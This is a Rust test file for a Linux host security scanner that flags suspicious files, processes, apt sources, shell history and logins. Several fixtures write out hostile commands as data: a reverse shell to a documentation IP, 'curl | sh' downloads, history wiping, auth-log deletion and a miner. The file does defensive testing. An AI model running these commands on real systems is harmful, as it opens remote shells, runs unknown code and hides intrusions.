//! Tests for the file, process, source, history and login checks, with made-up files in a
//! temporary directory. Nothing on the real system is read or changed.

use scanner::config::Config;
use scanner::modules::filemarks::{judge_capabilities, lock_matters, parse_capabilities};
use scanner::modules::netwatch::nat_redirects;
use scanner::modules::persistence::apt::{host_of, parse_deb822, parse_list};
use scanner::modules::persistence::history::judge_command;
use scanner::modules::{Collector, ScanCtx};
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn titles<'a>(report: &'a Report, rule: &str) -> Vec<&'a str> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| f.title.as_str()).collect()
}

fn severities(report: &Report, rule: &str) -> Vec<Severity> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| f.severity).collect()
}

#[test]
fn programs_in_temp_folders_and_suid_shells_are_reported() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    for (path, content, mode) in [
        ("/tmp/build/tool", "\u{7f}ELF....", 0o755),
        ("/dev/shm/x/run.sh", "#!/bin/sh\n", 0o700),
        ("/tmp/notes/readme", "just text", 0o755),
        ("/tmp/data/lib", "\u{7f}ELF....", 0o644),
        ("/usr/local/bin/bash", "dummy", 0o4755),
    ] {
        write(root, path, content);
        fs::set_permissions(root.join(&path[1..]), fs::Permissions::from_mode(mode)).expect("chmod");
    }
    let report = scan(root, &[ModuleId::FsPerms]);
    let temp = titles(&report, "FS-TMP-EXEC");
    assert_eq!(temp.len(), 2, "{temp:?}");
    assert!(temp[0].ends_with("/dev/shm/x") && temp[1].ends_with("/tmp/build"), "{temp:?}");
    assert_eq!(severities(&report, "FS-TMP-EXEC"), vec![Severity::High, Severity::Medium]);
    // the test files belong to the test user, so the SUID finding is "not root" (or "shell" when run as root)
    assert!(report.findings.iter().any(|f| f.rule == "FS-SUID-SHELL" || f.rule == "FS-SUID-NONROOT"));
}

#[test]
fn capabilities_are_decoded_and_judged() {
    // revision 2, effective; permitted = cap_setuid (7) and cap_perfmon (38)
    let mut data = Vec::new();
    for word in [0x0200_0001u32, 1 << 7, 0, 1 << 6, 0] {
        data.extend_from_slice(&word.to_le_bytes());
    }
    assert_eq!(parse_capabilities(&data), vec!["cap_setuid", "cap_perfmon"]);
    assert!(parse_capabilities(&[1, 2, 3]).is_empty());

    let sys = SysRoot::new("/nonexistent");
    let cfg = Config::default();
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[] };
    let judge = |path: &str, caps: &[&str]| {
        let mut col = Collector::default();
        judge_capabilities(&ctx, path, caps, "", &mut col);
        col.findings.first().map(|f| f.severity)
    };
    assert_eq!(judge("/usr/bin/ping", &["cap_net_raw"]), None);
    assert_eq!(judge("/usr/bin/newuidmap", &["cap_setuid"]), None);
    assert_eq!(judge("/usr/bin/python3.13", &["cap_setuid"]), Some(Severity::Critical));
    assert_eq!(judge("/home/anna/ping", &["cap_net_raw"]), Some(Severity::High));
    assert_eq!(judge("/usr/local/bin/agent", &["cap_sys_admin"]), Some(Severity::High));
    assert_eq!(judge("/usr/local/bin/agent", &["cap_net_raw"]), Some(Severity::Low));
    assert!(lock_matters("/etc/passwd") && lock_matters("/home/anna/.ssh/authorized_keys"));
    assert!(!lock_matters("/var/lib/thing") && !lock_matters("/home/anna/file"));
}

#[test]
fn changed_system_programs_are_critical() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/bin/ps", "replaced");
    write(root, "/usr/bin/ls", "original");
    write(root, "/usr/lib/x86_64-linux-gnu/security/pam_unix.so", "original");
    write(root, "/usr/lib/x86_64-linux-gnu/security/pam_added.so", "unknown");
    // md5("original")
    let sum = "919c8b643b7133116b02fc0d9bb7df3f";
    write(root, "/var/lib/dpkg/info/procps.md5sums", &format!("{sum}  usr/bin/ps\n"));
    write(root, "/var/lib/dpkg/info/coreutils.md5sums", &format!("{sum}  usr/bin/ls\n"));
    write(root, "/var/lib/dpkg/info/libpam-modules:amd64.md5sums", &format!("{sum}  usr/lib/x86_64-linux-gnu/security/pam_unix.so\n"));
    let report = scan(root, &[ModuleId::FsPerms]);
    let changed = titles(&report, "FS-SYSTEM-CHANGED");
    assert_eq!(changed.len(), 1, "{changed:?}");
    assert!(changed[0].ends_with("/usr/bin/ps"));
    let added = titles(&report, "FS-SYSTEM-UNPACKAGED");
    assert_eq!(added.len(), 1, "{added:?}");
    assert!(added[0].ends_with("pam_added.so"));
}

#[test]
fn busy_processes_and_odd_library_paths_are_reported() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/uptime", "10000.00 1.00\n");
    for (pid, exe, ticks, env) in [
        // 9000 s of CPU in 9999 s
        (100, "/home/anna/.cache/agent", 900_000, "LD_LIBRARY_PATH=/opt/app/lib:/tmp/.lib:\0"),
        (101, "/usr/bin/idle", 100, "LD_LIBRARY_PATH=/tmp/.mount_appimg/usr/lib\0"),
    ] {
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} (p) S 1 1 1 0 -1 4194560 0 0 0 0 {ticks} 0 0 0 20 0 1 0 100 0 0\n"));
        write(root, &format!("/proc/{pid}/environ"), env);
        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("link");
    }
    let report = scan(root, &[ModuleId::ProcAudit]);
    let busy: Vec<_> = report.findings.iter().filter(|f| f.rule == "PROC-HIGH-CPU").collect();
    assert_eq!(busy.len(), 1);
    assert_eq!(busy[0].severity, Severity::Medium);
    assert!(busy[0].evidence.contains("90 %"), "{}", busy[0].evidence);
    let libs = titles(&report, "PROC-LD-LIBRARY-PATH");
    assert_eq!(libs.len(), 1, "{libs:?}");
    assert!(libs[0].ends_with("/tmp/.lib"));
    assert_eq!(severities(&report, "PROC-LD-LIBRARY-PATH"), vec![Severity::High]);
}

#[test]
fn software_sources_are_read_in_both_formats() {
    let old = parse_list("s.list", "# deb http://no/ x main\ndeb http://deb.debian.org/debian trixie main\ndeb [ arch=amd64 trusted=yes ] https://user@repo.example.org:8443/apt stable main # note\n");
    assert_eq!(old.len(), 2);
    assert!(!old[0].unsigned && old[1].unsigned);
    assert_eq!(host_of(&old[1].uri).as_deref(), Some("repo.example.org"));
    let new = parse_deb822(
        "s.sources",
        "Types: deb\nURIs: https://a.example.org/x https://security.debian.org/debian-security\nSuites: trixie\nSigned-By:\n -----BEGIN PGP PUBLIC KEY BLOCK-----\n .\n -----END PGP PUBLIC KEY BLOCK-----\n\nTypes: deb\nURIs: http://off.example.org/\nEnabled: no\nTrusted: yes\n",
    );
    assert_eq!(new.iter().map(|s| s.uri.as_str()).collect::<Vec<_>>(), vec!["https://a.example.org/x", "https://security.debian.org/debian-security"]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/apt/sources.list.d/vendor.sources", "Types: deb\nURIs: https://repo.example.org/apt\nSuites: stable\n");
    write(root, "/etc/apt/sources.list.d/debian.list", "deb http://ftp.se.debian.org/debian trixie main\n");
    write(root, "/etc/apt/sources.list.d/old.list.save", "deb [trusted=yes] http://ignored.example.org/ x main\n");
    write(root, "/etc/apt/apt.conf.d/20ok", "DPkg::Post-Invoke { \"test -x /usr/bin/true && /usr/bin/true || true\"; };\n");
    write(root, "/etc/apt/apt.conf.d/99bad", "APT::Update::Pre-Invoke {\n  \"curl -s http://198.51.100.7/x | sh\";\n};\n");
    let report = scan(root, &[ModuleId::Persistence]);
    let third = titles(&report, "PERS-APT-THIRDPARTY");
    assert_eq!(third.len(), 1, "{third:?}");
    assert!(third[0].ends_with("repo.example.org"));
    assert!(titles(&report, "PERS-APT-UNSIGNED").is_empty());
    assert_eq!(severities(&report, "PERS-APT-HOOK"), vec![Severity::Critical]);
    assert!(report.inventory.persistence_files.contains_key("/etc/apt/sources.list.d/vendor.sources"));
}

#[test]
fn shell_history_shows_only_suspicious_commands() {
    let sys = SysRoot::new("/nonexistent");
    let cfg = Config::default();
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, wallet_watch_secs: 0, privileged: true, processes: &[] };
    let judge = |c: &str| judge_command(&ctx, c).map(|(s, _)| s);
    assert_eq!(judge("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"), Some(Severity::High));
    assert_eq!(judge("export HISTFILE=/dev/null"), Some(Severity::High));
    assert_eq!(judge("rm -f /var/log/auth.log"), Some(Severity::High));
    assert_eq!(judge("curl -s http://203.0.113.9/a.sh | sh"), Some(Severity::High));
    assert_eq!(judge("curl -sSf https://sh.rustup.rs | sh"), Some(Severity::Low));
    assert_eq!(judge("chattr +i /etc/resolv.conf"), Some(Severity::Medium));
    assert_eq!(judge("./xmrig --url pool.example.org"), Some(Severity::High));
    for ordinary in ["ls -la /tmp", "grep -r /dev/tcp /etc", "apt install xmrig", "ps aux | grep xmrig", "cd /home/anna && make", "apt update"] {
        assert_eq!(judge(ordinary), None, "{ordinary}");
    }

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/zsh\n");
    write(root, "/home/anna/.zsh_history", ": 1700000000:0;cat secret-notes\n: 1700000001:0;unset HISTFILE\n");
    write(root, "/home/anna/.local/share/fish/fish_history", "- cmd: ls\n  when: 1700000000\n");
    let report = scan(root, &[ModuleId::Persistence]);
    let hits: Vec<_> = report.findings.iter().filter(|f| f.rule == "PERS-HISTORY").collect();
    assert_eq!(hits.len(), 1);
    assert!(hits[0].evidence.contains("unset HISTFILE") && !hits[0].evidence.contains("secret-notes"));
}

#[test]
fn shared_ids_public_logins_and_redirect_rules() {
    let rules = "table ip nat {\n chain DOCKER {\n  tcp dport 80 dnat to 172.17.0.2:80\n }\n chain PREROUTING {\n  type nat hook prerouting priority dstnat; policy accept;\n  tcp dport 2222 redirect to :22\n  icmp type redirect drop\n }\n}\ntable ip libvirt_network {\n chain guest {\n  dnat to 192.168.122.2\n }\n}\n";
    let redirects = nat_redirects(rules);
    assert_eq!(redirects.len(), 1, "{redirects:?}");
    assert!(redirects[0].contains("2222"));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nanna:x:1000:1000::/home/anna:/bin/bash\nghost:x:1000:1000::/home/ghost:/bin/bash\n");
    write(root, "/etc/group", "root:x:0:\nanna:x:1000:\nusers:x:100:\nother:x:100:\n");
    write(root, "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h sshd-session[1]: Accepted publickey for anna from 8.8.4.4 port 1 ssh2\n2026-01-02T10:01:00+01:00 h sshd-session[2]: Accepted publickey for anna from 192.168.1.5 port 2 ssh2\n");
    let report = scan(root, &[ModuleId::Persistence, ModuleId::AuthLogs]);
    assert_eq!(severities(&report, "PERS-DUP-ID"), vec![Severity::High, Severity::Medium]);
    let public = titles(&report, "AUTH-SSH-PUBLIC");
    assert_eq!(public.len(), 1);
    assert!(public[0].ends_with("8.8.4.4"));
    assert_eq!(severities(&report, "AUTH-SSH-PUBLIC"), vec![Severity::Low]);
}
